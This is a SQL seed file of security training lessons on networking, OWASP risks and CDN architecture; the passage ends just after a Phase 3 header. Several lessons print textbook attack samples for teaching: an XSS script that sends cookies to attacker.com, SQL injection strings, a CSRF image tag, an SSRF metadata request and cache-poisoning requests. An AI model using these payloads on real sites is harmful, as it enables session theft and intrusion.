-- Seed data for Security Architect Training Platform
-- This includes lessons across all phases, quiz questions, and incident scenarios

-- =====================================================
-- PHASE 0: NETWORKING FOUNDATIONS (10 lessons)
-- =====================================================

INSERT INTO lessons (title, slug, phase, phase_name, day_number, reading_time_min, difficulty, content, objectives, key_takeaways, micro_lab, prerequisites) VALUES

-- Day 1
('OSI Model & Network Layers', 'osi-model', 0, 'Networking Foundations', 1, 12, 'beginner',
'# OSI Model & Network Layers

The OSI model divides networking into 7 layers: Physical, Data Link, Network, Transport, Session, Presentation, Application.

## Key Security Implications
- **L3 attacks**: IP spoofing
- **L4 attacks**: SYN floods
- **L7 attacks**: HTTP floods, application exploits

Understanding layers helps identify where attacks occur and how to defend.', 
'["Understand OSI layers", "Map protocols to layers", "Identify security threats by layer"]',
'["OSI has 7 layers", "Each layer has specific protocols", "Security threats target different layers"]',
'{"title": "Identify OSI Layers", "steps": ["Open browser DevTools (F12)", "Visit any site", "Check Network tab for HTTP (L7), TCP ports (L4), IP (L3)"], "expected_outcome": "See layered protocols in action"}',
'[]'),

-- Day 2
('TCP/IP Model & Protocol Suite', 'tcpip-model', 0, 'Networking Foundations', 2, 10, 'beginner',
'# TCP/IP Model

TCP/IP is the practical 4-layer model: Link, Internet, Transport, Application.

## Key Protocols
- **Application**: HTTP, DNS, SSH
- **Transport**: TCP (reliable), UDP (fast)
- **Internet**: IP, ICMP, IPsec
- **Link**: Ethernet, Wi-Fi

## Why TCP/IP Matters
Real-world networks use TCP/IP. Understanding it is essential for security analysis.',
'["Understand TCP/IP layers", "Differentiate from OSI", "Know core protocols"]',
'["TCP/IP has 4 layers", "TCP provides reliability", "UDP provides speed", "IP handles addressing and routing"]',
'{"title": "Protocol Analysis", "steps": ["Run: curl -v https://example.com", "Identify protocols used", "Note TCP handshake, TLS negotiation, HTTP request"], "expected_outcome": "See TCP/IP stack in real connection"}',
'[1]'),

-- Day 3
('IPv4 Addressing & Subnetting', 'ipv4-subnetting', 0, 'Networking Foundations', 3, 15, 'intermediate',
'# IPv4 Addressing & Subnetting

IPv4 uses 32-bit addresses (e.g., 192.168.1.1). Subnetting divides networks using subnet masks.

## CIDR Notation
- 192.168.1.0/24 = 256 addresses
- 10.0.0.0/8 = 16 million addresses
- /32 = single host

## Security Implications
- **Spoofing**: Attacker forges source IP
- **Scanning**: Enumerate hosts in subnet
- **ACLs**: Block/allow by IP range',
'["Calculate subnet ranges", "Understand CIDR notation", "Apply to security policies"]',
'["IPv4 is 32-bit", "CIDR uses /prefix notation", "Subnetting enables network segmentation", "IP ranges critical for ACLs"]',
NULL,
'[1,2]'),

-- Day 4
('TCP Deep Dive: 3-Way Handshake', 'tcp-handshake', 0, 'Networking Foundations', 4, 12, 'intermediate',
'# TCP 3-Way Handshake

TCP establishes reliable connections through:
1. **SYN**: Client initiates
2. **SYN-ACK**: Server acknowledges
3. **ACK**: Client confirms

## Security Threats
- **SYN Flood**: Exhaust server resources by sending SYNs without ACKs
- **RST Attack**: Inject RST packets to kill connections
- **Sequence Number Prediction**: Hijack TCP sessions

## Mitigation
- SYN cookies
- Rate limiting
- Firewall stateful inspection',
'["Understand TCP handshake steps", "Recognize SYN flood attacks", "Know mitigation techniques"]',
'["TCP uses 3-way handshake", "SYN floods target handshake", "Stateful firewalls track connections"]',
NULL,
'[2,3]'),

-- Day 5
('DNS: Domain Name System', 'dns-basics', 0, 'Networking Foundations', 5, 14, 'intermediate',
'# DNS: Domain Name System

DNS translates domain names to IP addresses.

## DNS Record Types
- **A**: IPv4 address
- **AAAA**: IPv6 address
- **CNAME**: Alias
- **MX**: Mail server
- **TXT**: Text (often for SPF, DKIM)
- **NS**: Name server

## Security Threats
- **DNS Poisoning**: Inject fake records
- **DNS Tunneling**: Exfiltrate data via DNS queries
- **DDoS**: Flood DNS servers
- **DNS Amplification**: Amplify attacks using open resolvers

## Defense
- DNSSEC (signature validation)
- Rate limiting
- Monitor for anomalous queries',
'["Understand DNS resolution", "Know common record types", "Identify DNS attacks", "Apply DNS security measures"]',
'["DNS maps names to IPs", "DNS poisoning is a real threat", "DNSSEC provides integrity", "Monitor DNS for anomalies"]',
'{"title": "DNS Lookup", "steps": ["Run: nslookup example.com", "Run: dig example.com +short", "Check A, MX, NS records"], "expected_outcome": "Understand DNS resolution process"}',
'[2,5]'),

-- Day 6
('HTTP Fundamentals', 'http-fundamentals', 0, 'Networking Foundations', 6, 10, 'beginner',
'# HTTP Fundamentals

HTTP (Hypertext Transfer Protocol) is the foundation of web communication.

## HTTP Methods
- **GET**: Retrieve data
- **POST**: Submit data
- **PUT**: Update resource
- **DELETE**: Remove resource
- **HEAD**: Get headers only
- **OPTIONS**: Check allowed methods

## Status Codes
- **2xx**: Success (200 OK)
- **3xx**: Redirection (301 Moved)
- **4xx**: Client Error (404 Not Found)
- **5xx**: Server Error (500 Internal Error)

## Security Headers
- Content-Type
- Authorization
- Cookie',
'["Know HTTP methods", "Understand status codes", "Recognize security headers"]',
'["HTTP is stateless", "Methods have different purposes", "Status codes indicate results", "Headers carry metadata"]',
NULL,
'[1,2]'),

-- Day 7
('HTTPS & TLS Basics', 'https-tls-basics', 0, 'Networking Foundations', 7, 15, 'intermediate',
'# HTTPS & TLS

HTTPS = HTTP + TLS/SSL encryption

## TLS Handshake (Simplified)
1. Client Hello (supported ciphers)
2. Server Hello (chosen cipher, certificate)
3. Key Exchange
4. Encrypted Communication

## Why HTTPS Matters
- **Confidentiality**: Encrypt data in transit
- **Integrity**: Detect tampering
- **Authentication**: Verify server identity

## Common Issues
- Expired certificates
- Self-signed certificates
- Weak ciphers (SSLv3, TLS 1.0)
- Certificate chain issues',
'["Understand TLS handshake", "Know certificate validation", "Recognize weak configurations"]',
'["HTTPS encrypts HTTP", "TLS provides CIA triad", "Certificates prove identity", "Modern TLS 1.2+ required"]',
NULL,
'[6,7]'),

-- Day 8
('Load Balancing & Reverse Proxy', 'load-balancing', 0, 'Networking Foundations', 8, 12, 'intermediate',
'# Load Balancing & Reverse Proxy

## Load Balancer Types
- **L4 (Transport)**: Balance by IP/port (fast, less flexible)
- **L7 (Application)**: Balance by HTTP headers, cookies, URL (slower, more flexible)

## Algorithms
- Round Robin
- Least Connections
- IP Hash
- Weighted

## Reverse Proxy Benefits
- SSL termination
- Caching
- Compression
- Security (hide origin)

## Security Implications
- **X-Forwarded-For**: Preserve client IP
- **SSL Offloading**: Decrypt at proxy
- **DDoS Protection**: Absorb at edge',
'["Differentiate L4 vs L7", "Understand balancing algorithms", "Know reverse proxy benefits"]',
'["L4 is fast, L7 is flexible", "Reverse proxies hide origins", "X-Forwarded-For preserves client IP", "Load balancers improve availability"]',
NULL,
'[4,7]'),

-- Day 9
('Caching Fundamentals', 'caching-fundamentals', 0, 'Networking Foundations', 9, 10, 'intermediate',
'# Caching Fundamentals

Caching stores frequently accessed data closer to users.

## Cache-Control Headers
- **max-age**: How long to cache (seconds)
- **no-cache**: Revalidate before using
- **no-store**: Never cache
- **public**: Cacheable by any cache
- **private**: Cacheable by browser only

## Cache Key
Combination of URL, headers (Vary), cookies used to identify cached objects.

## Security Considerations
- **Cache Poisoning**: Inject malicious content into cache
- **Sensitive Data**: Never cache auth tokens, PII
- **Vary Header**: Ensure correct object served',
'["Understand caching mechanics", "Know Cache-Control directives", "Recognize cache security risks"]',
'["Caching improves performance", "Cache-Control manages behavior", "Cache poisoning is a real threat", "Never cache sensitive data"]',
NULL,
'[6,8]'),

-- Day 10
('Common Network Tools', 'network-tools', 0, 'Networking Foundations', 10, 12, 'beginner',
'# Common Network Tools

## Diagnostic Tools
- **ping**: Test reachability (ICMP)
- **traceroute/tracert**: Show path to destination
- **nslookup/dig**: DNS queries
- **curl/wget**: HTTP requests
- **netstat/ss**: Show network connections
- **tcpdump/Wireshark**: Packet capture

## Security Tools
- **nmap**: Port scanning
- **nc (netcat)**: TCP/UDP connections
- **openssl**: TLS testing

## Why Learn These
Essential for troubleshooting and security analysis.',
'["Know basic diagnostic tools", "Understand their output", "Apply to troubleshooting"]',
'["ping tests connectivity", "traceroute shows path", "curl makes HTTP requests", "tcpdump captures packets"]',
'{"title": "Tool Exploration", "steps": ["Run: curl -I https://example.com", "Run: ping 8.8.8.8 (Google DNS)", "Check response times"], "expected_outcome": "Familiarity with basic network commands"}',
'[1,2,5]');

-- =====================================================
-- PHASE 1: CYBERSECURITY FOUNDATIONS (10 lessons)
-- =====================================================

INSERT INTO lessons (title, slug, phase, phase_name, day_number, reading_time_min, difficulty, content, objectives, key_takeaways, micro_lab, prerequisites) VALUES

-- Day 11
('CIA Triad & Threat Modeling', 'cia-triad', 1, 'Cybersecurity Foundations', 11, 10, 'beginner',
'# CIA Triad

The foundation of information security:

## Confidentiality
Prevent unauthorized access to data (encryption, access controls)

## Integrity
Ensure data is not tampered with (hashing, signatures)

## Availability
Ensure systems are accessible when needed (redundancy, DDoS protection)

## Threat Modeling
Identify: Assets → Threats → Vulnerabilities → Mitigations

Think like an attacker to defend better.',
'["Understand CIA triad", "Apply threat modeling mindset"]',
'["CIA is the security foundation", "Threats target C, I, or A", "Threat modeling is proactive security"]',
NULL,
'[]'),

-- Day 12
('Authentication & Authorization', 'authn-authz', 1, 'Cybersecurity Foundations', 12, 12, 'intermediate',
'# AuthN vs AuthZ

## Authentication (AuthN)
**Who are you?**
- Password
- MFA (multi-factor)
- Biometrics
- Certificates

## Authorization (AuthZ)
**What can you do?**
- RBAC (Role-Based Access Control)
- ABAC (Attribute-Based Access Control)
- Permissions, policies

## Sessions vs JWT
- **Sessions**: Server stores state
- **JWT**: Token stores state (stateless)

## Security Considerations
- Never trust client input
- Verify on every request
- Principle of least privilege',
'["Differentiate AuthN and AuthZ", "Understand sessions vs JWT", "Apply least privilege"]',
'["AuthN = identity, AuthZ = permissions", "Sessions are stateful, JWT is stateless", "Always verify authorization"]',
NULL,
'[11]'),

-- Day 13
('OWASP Top 10 - Part 1', 'owasp-top-10-part1', 1, 'Cybersecurity Foundations', 13, 15, 'intermediate',
'# OWASP Top 10 (Part 1)

## 1. Broken Access Control
Users can access unauthorized resources.
**Example**: Change user ID in URL to see others' data
**Fix**: Server-side authorization checks

## 2. Cryptographic Failures
Sensitive data exposed due to weak/missing encryption.
**Example**: Passwords stored in plaintext
**Fix**: Hash passwords (bcrypt), encrypt data at rest/transit

## 3. Injection
Untrusted data sent to interpreter (SQL, OS, LDAP).
**Example**: SQL Injection: `" OR 1=1 --`
**Fix**: Parameterized queries, input validation

## 4. Insecure Design
Lack of security controls in design phase.
**Fix**: Threat modeling, secure design patterns

## 5. Security Misconfiguration
Default configs, unnecessary features enabled.
**Example**: Default admin password
**Fix**: Hardening, disable unused features',
'["Know OWASP Top 10 threats", "Understand real-world examples", "Apply fixes"]',
'["Broken access control is #1 threat", "Always use parameterized queries", "Design security from the start", "Harden configurations"]',
NULL,
'[11,12]'),

-- Day 14
('OWASP Top 10 - Part 2', 'owasp-top-10-part2', 1, 'Cybersecurity Foundations', 14, 15, 'intermediate',
'# OWASP Top 10 (Part 2)

## 6. Vulnerable Components
Using libraries with known vulnerabilities.
**Fix**: Keep dependencies updated, use SCA tools

## 7. Identification and Authentication Failures
Weak authentication allows attackers in.
**Example**: No rate limiting on login
**Fix**: MFA, strong password policy, rate limiting

## 8. Software and Data Integrity Failures
Lack of integrity checks allows malicious updates.
**Example**: Unsigned package installations
**Fix**: Code signing, SRI (Subresource Integrity)

## 9. Security Logging and Monitoring Failures
Can''t detect or respond to breaches.
**Fix**: Centralized logging, alerting, SIEM

## 10. Server-Side Request Forgery (SSRF)
App fetches remote resource without validation.
**Example**: Fetch internal metadata endpoint
**Fix**: Whitelist allowed hosts, network segmentation',
'["Complete OWASP Top 10 knowledge", "Recognize real attacks", "Know comprehensive defenses"]',
'["Vulnerable components are common", "Logging is critical for detection", "SSRF can access internal systems", "Stay updated on OWASP"]',
NULL,
'[13]'),

-- Day 15
('XSS: Cross-Site Scripting', 'xss-attacks', 1, 'Cybersecurity Foundations', 15, 14, 'intermediate',
'# Cross-Site Scripting (XSS)

Inject malicious scripts into trusted websites.

## Types
- **Reflected**: Payload in URL, executed immediately
- **Stored**: Payload saved to database, executed when viewed
- **DOM-based**: Payload manipulates client-side JS

## Example Attack
```
<script>document.location="http://attacker.com?cookie="+document.cookie</script>
```

## Impact
- Cookie theft
- Session hijacking
- Defacement
- Phishing

## Defense
- **Output encoding**: Escape special chars (<, >, ", '')
- **CSP**: Content-Security-Policy header
- **HTTPOnly cookies**: Prevent JS access
- **Input validation**: Sanitize user input',
'["Understand XSS types", "Recognize XSS vectors", "Apply multiple defenses"]',
'["XSS executes attacker code in victim browser", "CSP limits script execution", "Output encoding is critical", "HTTPOnly protects cookies"]',
NULL,
'[13,14]'),

-- Day 16
('SQL Injection Deep Dive', 'sql-injection', 1, 'Cybersecurity Foundations', 16, 14, 'intermediate',
'# SQL Injection

Manipulate SQL queries via untrusted input.

## Classic Example
```sql
SELECT * FROM users WHERE username = ''admin'' OR ''1''=''1'' --'' AND password = ''x''
```
Result: Always true, bypass auth

## Types
- **In-band**: Results in same channel
- **Blind**: No direct output, infer from behavior
- **Out-of-band**: Data exfiltrated via different channel (DNS, HTTP)

## Impact
- Data theft
- Authentication bypass
- Remote code execution (via xp_cmdshell, etc.)

## Defense
- **Parameterized queries**: Treat input as data, not code
- **ORMs**: Many handle escaping automatically
- **Least privilege**: DB user with minimal permissions
- **WAF**: Detect/block SQLi patterns',
'["Understand SQL injection mechanics", "Know attack variations", "Apply defense in depth"]',
'["SQLi is still common", "Parameterized queries are the fix", "WAFs add defense layer", "Least privilege limits damage"]',
NULL,
'[13,14]'),

-- Day 17
('CSRF & SSRF Attacks', 'csrf-ssrf', 1, 'Cybersecurity Foundations', 17, 12, 'intermediate',
'# CSRF: Cross-Site Request Forgery

Trick user into executing unwanted actions.

## Example
```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```
Victim''s browser sends authenticated request.

## Defense
- **CSRF tokens**: Random value per session
- **SameSite cookies**: Prevent cross-origin requests
- **Check Referer/Origin headers**

# SSRF: Server-Side Request Forgery

App makes requests on behalf of attacker.

## Example
```
GET /fetch?url=http://169.254.169.254/latest/meta-data/
```
Access internal AWS metadata.

## Defense
- **Whitelist** allowed hosts
- **Network segmentation**
- **Disable unnecessary URL schemes** (file://, gopher://)',
'["Understand CSRF mechanics", "Know SSRF risks", "Apply comprehensive defenses"]',
'["CSRF exploits trust in browser", "CSRF tokens prevent attacks", "SSRF accesses internal resources", "Whitelist external requests"]',
NULL,
'[14,15,16]'),

-- Day 18
('Security Headers', 'security-headers', 1, 'Cybersecurity Foundations', 18, 10, 'intermediate',
'# Security Headers

HTTP headers that improve browser security.

## Essential Headers

### Content-Security-Policy (CSP)
Control resource loading
```
Content-Security-Policy: default-src ''self''; script-src ''self'' https://trusted.com
```

### Strict-Transport-Security (HSTS)
Force HTTPS
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

### X-Frame-Options
Prevent clickjacking
```
X-Frame-Options: DENY
```

### X-Content-Type-Options
Prevent MIME sniffing
```
X-Content-Type-Options: nosniff
```

### Referrer-Policy
Control referrer information
```
Referrer-Policy: strict-origin-when-cross-origin
```

## Impact
Significantly reduce attack surface with proper headers.',
'["Know essential security headers", "Understand their purpose", "Implement in applications"]',
'["CSP prevents XSS", "HSTS enforces HTTPS", "X-Frame-Options prevents clickjacking", "Headers are low-hanging fruit"]',
NULL,
'[15,17]'),

-- Day 19
('Encryption & Hashing', 'encryption-hashing', 1, 'Cybersecurity Foundations', 19, 12, 'intermediate',
'# Encryption vs Hashing

## Encryption (Reversible)
Convert plaintext to ciphertext using a key.

### Symmetric
Same key for encryption/decryption (AES, ChaCha20)
- **Fast**
- **Key distribution challenge**

### Asymmetric
Public key encrypts, private key decrypts (RSA, ECC)
- **Slower**
- **No shared secret needed**

## Hashing (One-way)
Convert input to fixed-size output (irreversible).

### Use Cases
- Password storage (bcrypt, Argon2)
- Integrity checking (SHA-256)
- Digital signatures

### Salt
Random value added to password before hashing
- **Prevents rainbow table attacks**
- **Each user has unique salt**

## Best Practices
- **Passwords**: Hash with salt (bcrypt/Argon2)
- **Data at rest**: Encrypt with AES-256
- **Data in transit**: TLS 1.2+',
'["Differentiate encryption and hashing", "Know when to use each", "Apply best practices"]',
'["Encryption is reversible, hashing is not", "Use bcrypt for passwords", "Salt prevents rainbow tables", "AES-256 for encryption"]',
NULL,
'[7,11]'),

-- Day 20
('Incident Response Fundamentals', 'incident-response-basics', 1, 'Cybersecurity Foundations', 20, 14, 'intermediate',
'# Incident Response Process

## 6 Phases

### 1. Preparation
- IR plan, team, tools
- Monitoring and detection capabilities

### 2. Identification
- Detect anomaly
- Determine if security incident
- Scope assessment

### 3. Containment
- **Short-term**: Isolate affected systems
- **Long-term**: Temporary fixes, segmentation

### 4. Eradication
- Remove threat (malware, attacker access)
- Patch vulnerabilities
- Strengthen defenses

### 5. Recovery
- Restore systems to normal operation
- Monitor for re-infection
- Validate functionality

### 6. Lessons Learned
- Post-mortem
- Document what happened
- Update IR plan

## Key Metrics
- **MTTD**: Mean Time to Detect
- **MTTR**: Mean Time to Respond
- **Dwell Time**: Time attacker remains undetected

## Incident Types
- Data breach
- DDoS attack
- Malware infection
- Insider threat
- Account compromise',
'["Understand IR phases", "Know key metrics", "Apply structured response"]',
'["IR has 6 phases", "Fast detection is critical", "Document lessons learned", "Preparation prevents panic"]',
NULL,
'[11,12,13,14]');

-- =====================================================
-- PHASE 2: CDN & EDGE ARCHITECTURE (10 lessons)
-- =====================================================

INSERT INTO lessons (title, slug, phase, phase_name, day_number, reading_time_min, difficulty, content, objectives, key_takeaways, micro_lab, prerequisites) VALUES

-- Day 21
('CDN Architecture Fundamentals', 'cdn-architecture', 2, 'CDN & Edge Architecture', 21, 12, 'intermediate',
'# CDN Architecture

Content Delivery Networks distribute content globally for performance and availability.

## Components

### Edge Nodes (PoPs)
- Geographically distributed servers
- Cache content close to users
- Terminate TLS connections

### Midgress/Regional Caches
- Intermediate tier between edge and origin
- Reduce origin load
- Additional caching layer

### Origin/Origin Shield
- Source of truth
- Protected by CDN
- Shield reduces origin requests

## Benefits
- **Performance**: Low latency via proximity
- **Availability**: Absorb traffic spikes
- **Security**: DDoS protection, WAF at edge
- **Scalability**: Handle global traffic

## How It Works
1. User requests content
2. DNS routes to nearest edge
3. Edge checks cache
4. If miss, fetch from origin
5. Cache and serve to user',
'["Understand CDN architecture", "Know components and their roles", "Recognize CDN benefits"]',
'["CDNs cache content at edge", "Reduces latency and origin load", "Provides DDoS protection", "Edge is first line of defense"]',
NULL,
'[9,10]'),

-- Day 22
('Cache Keys & TTL Strategy', 'cache-keys-ttl', 2, 'CDN & Edge Architecture', 22, 14, 'intermediate',
'# Cache Keys & TTL

## Cache Key
Identifier for cached objects, typically:
- URL path
- Query strings (optional)
- Headers (via Vary)
- Cookies (selective)

## Example
```
URL: /api/user?id=123
Headers: Accept-Encoding: gzip
Cache Key: /api/user?id=123|gzip
```

## TTL (Time-To-Live)
How long content stays cached

### Setting TTL
```
Cache-Control: max-age=3600    # 1 hour
Cache-Control: max-age=86400   # 1 day
Cache-Control: no-cache        # Revalidate every time
```

## Edge vs Browser Cache
- **Edge**: CDN PoP cache (shared)
- **Browser**: Client-side cache (private)

## Strategy by Content Type
- **Static assets**: Long TTL (CSS, JS, images)
- **HTML**: Short TTL or no-cache
- **API**: Vary by use case
- **Personalized**: No cache or private

## Vary Header
```
Vary: Accept-Encoding, User-Agent
```
Create separate cache entries per value.',
'["Understand cache key components", "Set appropriate TTLs", "Use Vary header correctly"]',
'["Cache key determines uniqueness", "TTL controls freshness", "Static assets = long TTL", "Personalized content = no cache"]',
NULL,
'[9,21]'),

-- Day 23
('Cache Control Patterns', 'cache-control-patterns', 2, 'CDN & Edge Architecture', 23, 12, 'intermediate',
'# Cache Control Patterns

## Bypass Cache
```
Cache-Control: no-store
```
Never cache (auth tokens, sensitive data)

## Revalidation
```
Cache-Control: no-cache, must-revalidate
```
Always check origin before serving

## Stale-While-Revalidate
```
Cache-Control: max-age=60, stale-while-revalidate=86400
```
Serve stale content while fetching fresh

## Public vs Private
```
Cache-Control: public, max-age=3600      # CDN can cache
Cache-Control: private, max-age=3600     # Only browser caches
```

## s-maxage
```
Cache-Control: s-maxage=3600, max-age=60
```
Separate TTL for shared caches (CDN) vs browser

## Conditional Requests
```
If-Modified-Since: Wed, 21 Oct 2023 07:28:00 GMT
If-None-Match: "abc123"
```
Return 304 Not Modified if unchanged

## Purging/Invalidation
Force cache refresh:
- **Purge**: Delete specific object
- **Purge All**: Clear entire cache
- **Tag-based purge**: Invalidate by tags',
'["Master cache control directives", "Apply appropriate patterns", "Understand purging mechanisms"]',
'["no-store = never cache", "stale-while-revalidate improves UX", "s-maxage for CDN TTL", "Purging forces refresh"]',
NULL,
'[22]'),

-- Day 24
('Origin Protection Strategies', 'origin-protection', 2, 'CDN & Edge Architecture', 24, 10, 'intermediate',
'# Origin Protection

Protect origin servers from direct attacks.

## Techniques

### 1. Origin Shield
Additional caching layer before origin
- Collapses requests
- Reduces origin load by 70-90%

### 2. IP Whitelisting
Allow only CDN IPs to reach origin
```
# Example: Only allow Cloudflare IPs
iptables -A INPUT -s 173.245.48.0/20 -j ACCEPT
iptables -A INPUT -j DROP
```

### 3. Authentication
Shared secret between CDN and origin
```
X-Origin-Secret: abc123xyz
```

### 4. Rate Limiting at Edge
Limit requests before reaching origin
```
Rate: 100 req/sec per IP
Burst: 200
```

### 5. Origin-Pull Mode
CDN pulls content (origin never exposed publicly)

### 6. DDoS Protection
CDN absorbs attack traffic before hitting origin

## Best Practices
- Never expose origin IP publicly
- Use private backbone when possible
- Monitor origin load
- Implement health checks',
'["Understand origin protection needs", "Apply multiple protection layers", "Configure rate limiting"]',
'["Origin Shield reduces load", "Whitelist CDN IPs only", "Rate limiting at edge", "Never expose origin IP"]',
NULL,
'[21,23]'),

-- Day 25
('Edge Computing & Workers', 'edge-computing', 2, 'CDN & Edge Architecture', 25, 14, 'advanced',
'# Edge Computing

Execute code at CDN edge for dynamic content and logic.

## Use Cases
- **URL rewrites**: Redirect/rewrite requests
- **A/B testing**: Route by cookie/header
- **Authentication**: Verify JWT at edge
- **Bot detection**: Challenge suspicious traffic
- **Image optimization**: Resize/compress on-the-fly
- **Geo-routing**: Serve regional content

## Example: Edge Worker (Cloudflare Workers)
```javascript
addEventListener(''fetch'', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  
  // Block bad bots
  const userAgent = request.headers.get(''User-Agent'')
  if (userAgent && userAgent.includes(''BadBot'')) {
    return new Response(''Blocked'', { status: 403 })
  }
  
  // Add security header
  const response = await fetch(request)
  const newResponse = new Response(response.body, response)
  newResponse.headers.set(''X-Frame-Options'', ''DENY'')
  return newResponse
}
```

## Benefits
- **Low latency**: Execute near user
- **Reduced origin load**: Handle logic at edge
- **Flexibility**: Custom logic without origin changes

## Limitations
- CPU/memory limits
- Cold starts (some platforms)
- Debugging complexity',
'["Understand edge computing concepts", "Know use cases", "Write basic edge functions"]',
'["Edge workers run at CDN", "Low latency execution", "Useful for auth, routing, blocking", "Be aware of resource limits"]',
NULL,
'[21,24]'),

-- Day 26
('Traffic Steering & Failover', 'traffic-steering', 2, 'CDN & Edge Architecture', 26, 12, 'intermediate',
'# Traffic Steering & Failover

Route traffic intelligently for performance and reliability.

## Geo-Routing
Route based on user location
```
US users → us-origin.example.com
EU users → eu-origin.example.com
```

## Load Balancing
Distribute across multiple origins
- **Round-robin**: Equal distribution
- **Weighted**: Proportion by capacity
- **Least connections**: To least loaded
- **Geo-proximity**: To nearest

## Health Checks
Monitor origin availability
```
Check: HTTP GET /health every 30s
Expect: 200 OK
Timeout: 5s
Failures: 3 consecutive = mark down
```

## Failover
Automatic switching to backup
```
Primary: origin1.example.com (preferred)
Secondary: origin2.example.com (failover)
```

## Blue-Green Deployments
Zero-downtime updates
```
Blue (current): 100% traffic
Green (new): 0% traffic
→ Validate Green
→ Switch traffic: Green 100%
→ Rollback option: Switch back to Blue
```

## Canary Releases
Gradual rollout
```
v1: 90% traffic
v2: 10% traffic (canary)
→ Monitor metrics
→ Increase v2 if healthy
```',
'["Understand traffic steering options", "Configure health checks", "Implement failover strategies"]',
'["Geo-routing improves latency", "Health checks detect failures", "Failover ensures availability", "Canary releases reduce risk"]',
NULL,
'[21,24]'),

-- Day 27
('CDN Security Best Practices', 'cdn-security', 2, 'CDN & Edge Architecture', 27, 10, 'intermediate',
'# CDN Security Best Practices

## 1. Always Use HTTPS
- Force HTTPS redirects
- Enable HSTS
- Use TLS 1.2+ only

## 2. Origin Protection
- Whitelist CDN IPs
- Use origin authentication
- Enable origin shield

## 3. Access Control
- Signed URLs/Cookies for private content
- Token-based authentication
- IP-based restrictions

## 4. Security Headers
Deploy at edge for all responses
```
Content-Security-Policy: default-src ''self''
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
```

## 5. Rate Limiting
Prevent abuse
```
100 req/sec per IP
1000 req/min per API key
```

## 6. DDoS Protection
- Enable at CDN level
- Set thresholds
- Challenge on spike

## 7. WAF at Edge
Block OWASP Top 10 attacks

## 8. Monitoring & Alerts
- Traffic anomalies
- Error rate spikes
- Cache hit ratio drops
- Origin health

## 9. Log Everything
Enable comprehensive logging for forensics',
'["Apply CDN security best practices", "Configure multiple protection layers", "Set up monitoring"]',
'["HTTPS everywhere", "Protect origin from direct access", "Rate limiting prevents abuse", "Monitor for anomalies"]',
NULL,
'[24,25,26]'),

-- Day 28
('Cache Poisoning Attacks', 'cache-poisoning', 2, 'CDN & Edge Architecture', 28, 14, 'advanced',
'# Cache Poisoning

Inject malicious content into CDN cache.

## Web Cache Poisoning
Exploit cache key mismatch
```
Request:
GET /page.html HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com

Response includes attacker.com link
→ Cached for all users
```

## Attack Vectors
- **Unkeyed headers**: Headers not in cache key
- **Parameter cloaking**: Hide params from cache key
- **Fat GET**: Use HTTP verb variations

## Example Attack
```
GET /page?callback=alert(1) HTTP/1.1

Response:
<script>alert(1)</script>

→ Stored in cache
→ Served to all users = Stored XSS
```

## Defense
1. **Normalize cache keys**: Include relevant headers/params
2. **Input validation**: Sanitize all inputs
3. **Output encoding**: Escape dynamic content
4. **Short TTL**: Limit poisoning window
5. **Vary header**: Cache separately by important headers
6. **Security scanning**: Test for cache poisoning

## Detection
- Monitor for unusual cache miss patterns
- Check for unexpected cached responses
- Review cache key configuration',
'["Understand cache poisoning mechanics", "Recognize attack vectors", "Apply comprehensive defenses"]',
'["Cache poisoning exploits key mismatches", "Can lead to stored XSS", "Include relevant headers in cache key", "Short TTL limits impact"]',
NULL,
'[22,23,27]'),

-- Day 29
('CDN Analytics & Optimization', 'cdn-analytics', 2, 'CDN & Edge Architecture', 29, 10, 'intermediate',
'# CDN Analytics & Optimization

## Key Metrics

### Performance
- **Cache Hit Ratio**: % requests served from cache
- **TTFB**: Time To First Byte
- **Latency**: P50, P95, P99 response times
- **Bandwidth**: Data transferred

### Reliability
- **Availability**: % uptime
- **Error Rate**: 4xx, 5xx responses
- **Origin Health**: Response time, errors

### Security
- **Blocked Requests**: By WAF, rate limiter
- **Attack Traffic**: DDoS, bot traffic
- **Threat Intelligence**: Known malicious IPs

## Optimization Strategies

### Improve Cache Hit Ratio
- Increase TTL where appropriate
- Normalize cache keys
- Enable origin shield
- Prefetch/warm cache

### Reduce Latency
- Enable HTTP/2 or HTTP/3
- Optimize image delivery (WebP, compression)
- Minify CSS/JS
- Enable compression (Brotli, gzip)

### Cost Optimization
- Increase caching
- Compress responses
- Use tiered pricing
- Review bandwidth usage

## Monitoring
Set up alerts for:
- Cache hit ratio drop (<80%)
- Error rate spike (>1%)
- Latency increase (P95 >500ms)
- Origin unavailability',
'["Know key CDN metrics", "Optimize for performance", "Set up effective monitoring"]',
'["Cache hit ratio is critical", "Monitor latency percentiles", "Alert on anomalies", "Optimize costs via caching"]',
NULL,
'[21,22,27]'),

-- Day 30
('Multi-CDN Strategy', 'multi-cdn-strategy', 2, 'CDN & Edge Architecture', 30, 12, 'advanced',
'# Multi-CDN Strategy

Use multiple CDN providers for resilience and performance.

## Why Multi-CDN?

### Benefits
- **Redundancy**: No single point of failure
- **Performance**: Best CDN per region
- **Cost optimization**: Leverage pricing
- **Avoid vendor lock-in**

### Challenges
- **Complexity**: Manage multiple providers
- **Cost**: Duplicate traffic
- **Cache consistency**: Sync between CDNs

## Implementation Patterns

### 1. DNS-Based Switching
```
example.com → cdn1.example.com (primary)
              cdn2.example.com (failover)
```

### 2. Geographic Split
```
US/Americas: CDN A
Europe: CDN B
Asia-Pacific: CDN C
```

### 3. Content-Type Split
```
Static assets: CDN A (cheaper)
API/Dynamic: CDN B (faster workers)
```

### 4. Active-Active
Route percentage to each CDN
```
CDN A: 70%
CDN B: 30%
```

## Configuration Management
- **Terraform/IaC**: Define config as code
- **Version control**: Track changes
- **Testing**: Validate in staging
- **Rollback plan**: Quick revert capability

## Monitoring
Unified dashboard across all CDNs
- Aggregate metrics
- Compare performance
- Detect issues quickly',
'["Understand multi-CDN benefits", "Know implementation patterns", "Manage complexity"]',
'["Multi-CDN improves reliability", "DNS can switch between CDNs", "Geographic split optimizes latency", "Use IaC for consistency"]',
NULL,
'[26,27,29]');


-- =====================================================
-- PHASE 3: WAF / BOT / API SECURITY (10 lessons)
-- =====================================================

INSERT INTO lessons (title, slug, phase, phase_name, day_number, reading_time_min, difficulty, content, objectives, key_takeaways, micro_lab, prerequisites) VALUES

-- Day 31
